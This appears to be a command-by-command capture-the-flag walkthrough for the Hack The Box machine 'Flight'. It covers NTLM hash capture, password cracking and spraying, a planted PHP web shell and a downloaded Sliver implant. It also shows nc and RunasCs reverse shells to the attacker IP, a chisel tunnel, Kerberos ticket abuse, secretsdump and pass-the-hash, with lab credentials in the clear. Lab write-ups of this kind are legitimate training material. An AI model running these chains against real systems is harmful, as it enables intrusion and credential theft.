```
nmap -sS -sC -sV -T5 -Pn 10.10.11.187
```
![image](https://github.com/user-attachments/assets/da0db716-6fc7-4868-9063-f8eb482b0699)

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.11.187/FUZZ -fs 301 -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/user-attachments/assets/2850a394-3d54-4977-af3e-06b6a0943679)

```
http://10.10.11.187/js/
http://10.10.11.187/webalizer
```
![image](https://github.com/user-attachments/assets/a46bbaff-8c71-4086-83f8-508087d7cbc5)

![image](https://github.com/user-attachments/assets/8c539968-e03e-4566-86fb-d881f66241e1)

![image](https://github.com/user-attachments/assets/a6c97e05-0847-4dec-9825-f516fe4e5919)

```
smbclient -L \\\\10.10.11.187\\
```
![image](https://github.com/user-attachments/assets/5bd1feb8-6623-4ea0-9228-3a18044dd1ed)

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://flight.htb/ -H "Host: FUZZ.flight.htb" -fs 7069 -fw 22
http://school.flight.htb/
```
![image](https://github.com/user-attachments/assets/aee893f0-607c-4bcf-a79f-6e64c1b3b467)

![image](https://github.com/user-attachments/assets/3544e75a-a72e-4445-a9a8-2d8425e73698)

![image](https://github.com/user-attachments/assets/afe1a807-2a86-4823-bc31-ed7d4613d2ec)

![image](https://github.com/user-attachments/assets/afd9a8ae-b88a-4ec2-9bf9-8b7c2b3a2282)


```
http://school.flight.htb/index.php?view=C:\Windows\System32\drivers\etc\hosts
http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
```
![image](https://github.com/user-attachments/assets/bb59771b-0276-4f81-9240-b5d3b50f927f)

![image](https://github.com/user-attachments/assets/556c0fb2-f7c6-4da5-ba99-f436de0fa2d4)

```
responder -I tun0 -v
http://school.flight.htb/index.php?view=//10.10.14.10/htb
```
![image](https://github.com/user-attachments/assets/1e1626e5-4301-4a47-a35b-c62de8278213)

![image](https://github.com/user-attachments/assets/2b28de17-b9a4-4712-8e0b-a1760f40fdc4)

![image](https://github.com/user-attachments/assets/5766689f-d589-4935-8e18-ab27fcefeaf7)

```
john hash -w=/usr/share/wordlists/rockyou.txt
```
![image](https://github.com/user-attachments/assets/cdd13c88-49a6-44dd-942d-de2ce714914c)

```
crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13'
smbclient -L \\\\10.10.11.187\\ -U flight.htb/svc_apache
smbclient \\\\10.10.11.187\\Users -U flight.htb/svc_apache
```
![image](https://github.com/user-attachments/assets/e294c7ed-cbe6-446f-a727-df2d691adf9b)

![image](https://github.com/user-attachments/assets/7c6e5380-1057-47e2-af76-99b635c8a462)

```
ldapdomaindump -u flight\\svc_apache -p 'S@Ss!K@*t13' 10.10.11.187
```
![image](https://github.com/user-attachments/assets/c3ebc833-0519-4560-b505-e72ff079fd02)

![image](https://github.com/user-attachments/assets/dcc8cf1f-0451-40b7-adb8-519e15e6fa2a)

```
cat domain_users.grep | grep "Domain Users" | awk -F' ' '{print $1}'
```
![image](https://github.com/user-attachments/assets/35ea9369-f4c7-4d9d-af70-c7aa79dbf8f3)

```
crackmapexec smb 10.10.11.187 -u users_all2 -p 'S@Ss!K@*t13'
smbclient \\\\10.10.11.187\\Users -U flight.htb/S.Moon
```
![image](https://github.com/user-attachments/assets/b2c28c8f-9b78-4ea5-a303-42bb3f8eb1bc)

![image](https://github.com/user-attachments/assets/e5025d57-1e46-460d-8c34-5a16dc3a7a12)

```
responder -I tun0 -v
git clone https://github.com/Greenwolf/ntlm_theft
cd ntlm_theft
python3 ntlm_theft.py --generate all --server 10.10.14.67 --filename htb
impacket-smbclient s.moon:'S@Ss!K@*t13'@flight.htb
use Shared
put htb/htb.scf
put htb/desktop.ini
```
![image](https://github.com/user-attachments/assets/10fbe7bd-87a5-48e3-bb56-023c24d00cc5)

![image](https://github.com/user-attachments/assets/b88fa92a-a028-4cbc-b5c2-66c7873b7b72)

![image](https://github.com/user-attachments/assets/f4e28f04-bad2-4f94-a7d0-a060cf8d571d)

![image](https://github.com/user-attachments/assets/1a94094b-c242-4f12-87c2-6001b7bd9647)

```
john hash2 -w=/usr/share/wordlists/rockyou.txt
```
![image](https://github.com/user-attachments/assets/c21d7cab-6462-4292-b2c1-78d94c8ca787)

```
smbmap -H flight.htb -u 'c.bum' -p 'Tikkycoll_431012284’
smbclient \\\\10.10.11.187\\Users -U flight.htb/c.bum
```
![image](https://github.com/user-attachments/assets/5f8f8e57-28d7-4b56-81ee-87b0b30ceadb)

![image](https://github.com/user-attachments/assets/302ae4c5-18e6-46f8-a03b-eca6ae622004)

![image](https://github.com/user-attachments/assets/1684f74d-d5b0-47b5-b676-18ac75e40f08)

```
shell.php
impacket-smbclient c.bum:'Tikkycoll_431012284'@flight.htb
use Web
cd flight.htb
put shell.php
curl 'http://flight.htb/shell.php?c=whoami'
```
![image](https://github.com/user-attachments/assets/cdaf2df1-802d-475f-b0d7-19d04a63c64e)

![image](https://github.com/user-attachments/assets/ac9f6582-c7d2-4c25-b307-d6f622182fb1)

![image](https://github.com/user-attachments/assets/7752f16c-5622-40f8-89e1-f73e954bde5a)

```
curl https://sliver.sh/install|sudo bash
sliver
service sliver start
```
![image](https://github.com/user-attachments/assets/7e2836e1-809d-41d9-bbb1-41ffe9863cf6)

![image](https://github.com/user-attachments/assets/7c22997e-2be4-4fdc-b72f-d3482509537b)

```
generate --os windows --arch 64bit --mtls 10.10.14.10 --reconnect 60 --save htb.exe
mtls
sudo python3 -m http.server 80
curl 'http://flight.htb/shell.php?c=powershell%20-c%20%22wget%2010.10.14.10%2Fhtb.exe%20-usebasicparsing%20-outfile%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe%3B%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe’
powershell -c "wget 10.10.14.67/htb.exe
-usebasiparsing -outfile C:\users\public\music\htb.exe; C:\users\public\music\htb.exe
sessions -i ce7
whoami
```
![image](https://github.com/user-attachments/assets/fdb9c34e-789b-44ed-8176-f8c7b6136895)

![image](https://github.com/user-attachments/assets/160a9bd1-dd78-4613-ab90-c23219853b1e)

```
upload RunasCs.exe
shell
.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.10:443 cmd
rlwrap -cAr nc -lnvp 443
```
![image](https://github.com/user-attachments/assets/4333ad89-9fd7-4050-a3c8-abbd2c1ac131)

![image](https://github.com/user-attachments/assets/119887a8-bf17-43ee-a172-7b3faaf16e3d)

```
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
cd C:\ProgramData
powershell -c wget 10.10.14.10/chisel_1.9.1_windows_amd64 -outfile c.exe
cd C:\inetpub\development
powershell -c wget 10.10.14.10/cmd.aspx -outfile cmd.aspx
./chisel_1.9.1_linux_amd64 server -p 8000 --reverse
.\c.exe client 10.10.14.10:8000 R:8001:127.0.0.1:8000
```
![image](https://github.com/user-attachments/assets/bdca86b0-a387-4e04-9c76-50411f413638)

![image](https://github.com/user-attachments/assets/6dcb86d6-3447-4771-a36d-de86ae4a3b3a)

```
http://127.0.0.1:8001/
```
![image](https://github.com/user-attachments/assets/a4d6eb09-9059-4a20-b467-ffca60eb1b28)

![image](https://github.com/user-attachments/assets/fc837a14-ffb6-4d0d-bc6d-1f383582e673)

```
[Open another terminal]
generate --os windows --arch 64bit --mtls 10.10.14.10 --reconnect 60 --save htb.exe
Mtls
sessions -i 78218585
upload RunasCs.exe
Shell
.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.10:443 cmd
rlwrap -cAr nc -lnvp 443
```
![image](https://github.com/user-attachments/assets/3a113998-1dc5-4410-8b61-c484bab5cf4b)

![image](https://github.com/user-attachments/assets/4a91b011-9e9b-45ec-9fb2-c69966ee2151)

```
[Open another terminal]
OR
powershell -c wget 10.10.14.10/RunasCs.exe -outfile RunasCs.exe
rlwrap -cAr nc -lnvp 443
.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.10:443 cmd
whoami /all
```
![image](https://github.com/user-attachments/assets/63c1f959-50cd-43ae-a76a-e5fc03b6392c)

![image](https://github.com/user-attachments/assets/c612edcb-0edf-4b3d-ab89-7c8d20265d61)

```
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
powershell -c wget 10.10.14.10/cmd.aspx -outfile cmd.aspx
http://127.0.0.1:8001/cmd.aspx
```
![image](https://github.com/user-attachments/assets/a069aa36-aed7-4d57-8d62-f0e1dcda6314)

![image](https://github.com/user-attachments/assets/5d06d231-b107-4302-9ea5-0e63ef8330f0)

```
cd C:\ProgramData
powershell -c wget 10.10.14.10/nc64.exe -outfile nc64.exe
cd C:\inetpub\development
powershell -c wget 10.10.14.10/cmd.aspx -outfile cmd.aspx
wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
http://127.0.0.1:8001/cmd.aspx
/c \ProgramData\nc64.exe -e cmd 10.10.14.10 443
rlwrap -cAr nc -lnvp 443
```
![image](https://github.com/user-attachments/assets/9615f407-2b80-4d81-8d9b-c116f2ce3292)

![image](https://github.com/user-attachments/assets/80674471-d7b9-4eac-ba95-2f71b28b502e)

![image](https://github.com/user-attachments/assets/ab427c83-1de6-4ed4-a7f3-15c3a63f98c6)

```
cd C:\ProgramData
powershell -c wget 10.10.14.10/Rubeus.exe -outfile Rubeus.exe
.\rubeus.exe tgtdeleg /nowrap
kirbi2ccache ticket.kirbi ticket.ccache
```
![image](https://github.com/user-attachments/assets/283dcf4b-40a0-4cad-a920-d2abe009304a)

```
cat ticket.b64 | base64 -d > ticket2.kirbi
```
impacket-ticketConverter ./ticket3.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
sudo service virtualbox-guest-utils stop
sudo ntpdate -s 10.10.11.187
10.10.11.187 g0.flight.htb
./secretsdump.py -k -no-pass g0.flight.htb -just-dc-user administrator
```
![image](https://github.com/user-attachments/assets/2ba39d78-6c3e-4cab-965e-f328debb03c0)

![image](https://github.com/user-attachments/assets/67cffcf8-2ac6-483a-9c3e-c324d580c59b)

```
impacket-psexec administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
type ..\..\Users\Administrator\Desktop\root.txt
```
![image](https://github.com/user-attachments/assets/91e04112-107e-42f4-b399-c1d51640eb66)
